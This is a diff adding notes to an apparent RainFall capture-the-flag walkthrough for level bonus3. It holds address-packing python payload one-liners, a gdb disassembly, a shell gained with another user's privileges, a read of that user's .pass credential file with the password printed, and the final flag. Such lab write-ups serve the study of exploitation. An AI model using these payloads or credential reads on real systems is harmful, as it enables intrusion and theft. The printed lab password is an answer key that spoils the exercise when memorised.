@@ -173,3 +173,39 @@ bonus3@RainFall:~$ ./bonus3 -1
 
 
 
+0x080485fa
+\xfa\x85\x04\x08
+
+$(python -c "print '2360' + '\xfa\x85\x04\x08'")
+
+
+(gdb) disas execl
+Dump of assembler code for function execl@plt:
+   0x08048420 <+0>:	jmp    *0x8049920
+   0x08048426 <+6>:	push   $0x38
+   0x0804842b <+11>:	jmp    0x80483a0
+End of assembler dump.
+
+0x8049920
+\x20\x99\x04\x08
+
+$(python -c "print '2360' + '\x20\x99\x04\x08'")
+
+
+bonus3@RainFall:~$ ./bonus3 ""
+$ id
+uid=2013(bonus3) gid=2013(bonus3) euid=2014(end) egid=100(users) groups=2014(end),100(users),2013(bonus3)
+$ cat /home/user/end/.pass
+3321b6f81659f9a71c76616f606e4b50189cecfea611393d5d649f75e157353c
+$ exit
+bonus3@RainFall:~$ 
+
+
+
+bonus3@RainFall:~$ su end 
+Password: 
+end@RainFall:~$ ls -l
+total 4
+-rwsr-s---+ 1 end users 26 Sep 23  2015 end
+end@RainFall:~$ cat end 
+Congratulations graduate!
